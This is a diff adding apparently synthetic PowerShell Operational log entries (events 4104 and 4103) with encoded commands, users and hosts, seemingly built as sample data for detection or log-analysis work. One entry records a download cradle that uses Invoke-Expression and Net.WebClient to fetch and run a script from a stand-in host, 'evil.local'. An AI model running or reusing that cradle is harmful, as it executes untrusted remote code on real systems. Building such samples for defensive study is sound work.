@@ -1,0 +1,39 @@
+Microsoft-Windows-PowerShell/Operational
+
+Event ID: 4104
+Time Created: 2026-07-10 11:05:20
+
+ScriptBlockText:
+powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==
+User: DOMAIN\Administrator
+Host: DESKTOP-01
+
+Event ID: 4104
+
+powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.local/script.ps1')
+
+User:
+ITAdmin
+
+Event ID: 4103
+
+powershell.exe
+
+Command:
+powershell -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUAKQA=
+
+User:
+HelpDesk01
+
+PowerShell Operational Log
+
+Event ID: 4104
+
+Script:
+Invoke-Expression "Get-Process"
+
+EncodedCommand:
+JABQAHIAbwBjAGUAcwBzAA==
+
+Host:
+WIN11-CLIENT
